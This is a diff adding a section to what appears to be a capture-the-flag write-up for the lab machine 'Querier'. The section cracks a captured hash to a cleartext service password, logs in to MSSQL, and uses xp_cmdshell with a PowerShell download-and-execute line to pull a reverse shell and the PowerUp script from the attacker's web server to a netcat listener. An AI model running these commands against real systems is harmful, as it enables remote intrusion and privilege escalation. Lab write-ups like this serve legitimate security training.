@@ -98,6 +98,49 @@ Now you should have been able to gather the hashes on term 2. Please see below f
 
 ![privilege Esc](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/responder_cred_grab.png)
 
+Next we will take that hash and put it into johntheripper and have the following credentials recovered:
+
+john password_hash -w=/usr/share/wordlist/rockyou.txt
+
+mssql-svc:corporate568
+
+now login with those credentials using:
+
+impacket-mssqlclient mssql-svc:@10.129.156.234 -windows-auth
+
+next on our local machine we will set up a listener with netcat, and a webserver using python3.
+
+Python3 server will be hosting 2 files
+- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
+
+For the first one you will add the following line to the end:
+
+Invoke-PowerShellTcp -Reverse -IPAddress YOUR_LOCAL_IP -Port PORT_CHOSEN
+
+For the second link you will add the following to the end of the script:
+
+Invoke-AllChecks
+
+Next create 2 terminals locally and do the following:
+Term 1: python3 -m http.server 80
+Term 2: nc -lvnp PORT_CHOSEN
+
+now back on the terminal connected to our target input the following:
+
+xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\"http://YOUR_LOCAL_IP/Invoke-PowerShellTcp.ps1\")
+
+You now have a shell on your netcat listener.
+
+Next type in the following to your shell:
+
+iex(new-object net.webclient).downloadstring("http://10.10.16.2/PowerUp.ps1")
+
+this will give the following output:
+
+![privilege Esc](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/admin_cred_grab.png)
+
+
 </details>
 
 <details>
